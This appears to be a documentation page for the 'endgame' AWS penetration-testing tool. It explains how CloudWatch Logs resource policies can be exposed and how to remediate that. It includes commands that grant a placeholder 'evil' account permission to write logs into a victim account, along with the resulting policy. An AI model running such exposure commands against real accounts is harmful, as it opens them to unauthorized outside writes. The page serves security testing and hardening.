# CloudWatch Logs Resource Policies

CloudWatch Resource Policies allow other AWS services or IAM Principals to put log events into the account.

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [References](#references)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service cloudwatch --name test-resource-exposure
```

* To view the contents of the exposed resource policy, run the following:

```bash
aws logs describe-resource-policies
```

* Observe that the contents of the exposed resource policy match the example shown below.

## Example

```json
{
    "resourcePolicies": [
        {
            "policyName": "test-resource-exposure",
            "policyDocument": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:root\"},\"Action\":[\"logs:PutLogEventsBatch\",\"logs:PutLogEvents\",\"logs:CreateLogStream\"],\"Resource\":\"arn:aws:logs:*\"}]}",
            "lastUpdatedTime": 1613244111319
        }
    ]
}
```

## Remediation

> ‚ÄºÔ∏è **Note**: At the time of this writing, AWS Access Analyzer does **NOT** support auditing of this resource type to prevent resource exposure. **We kindly suggest to the AWS Team that they support all resources that can be attacked using this tool**. üòä

* **Trusted Accounts Only**: Ensure that CloudWatch Logs access is only shared with trusted accounts, and that the trusted accounts truly need access to write to the CloudWatch Logs.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **Restrict access to IAM permissions that could lead to exposing write access to your CloudWatch Logs**: Tightly control access to the following IAM actions:
      - [logs:PutResourcePolicy](https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_PutResourcePolicy.html): _Creates or updates a resource policy allowing other AWS services to put log events to this account_
      - [logs:DeleteResourcePolicy](https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_DeleteResourcePolicy.html): _Deletes a resource policy from this account. This revokes the access of the identities in that policy to put log events to this account._
      - [logs:DescribeResourcePolicies](https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_DescribeResourcePolicies.html): _Lists the resource policies in this account._

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities.
